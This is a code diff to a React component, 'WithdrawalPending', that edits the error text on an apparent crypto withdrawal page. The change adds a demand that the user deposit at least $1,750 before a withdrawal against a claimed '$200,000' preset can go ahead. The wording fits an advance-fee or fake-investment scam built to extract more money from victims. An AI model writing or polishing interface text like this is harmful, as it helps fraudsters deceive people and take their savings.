@@ -89,8 +89,9 @@ export default function WithdrawalPending() {
         <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
           <p className="text-xl font-semibold text-red-400">
             Withdraw amount too low for blockchain wire transfer standard to
-            local bank, Your standard preset withdrawal amount is $200,000
-            however your request has been submitted
+            local bank, Your standard preset withdrawal amount is $200,000,
+            consider making a deposit of at least $1,750 into your account,
+            however your request has been submitted.
           </p>
         </div>
       </div>
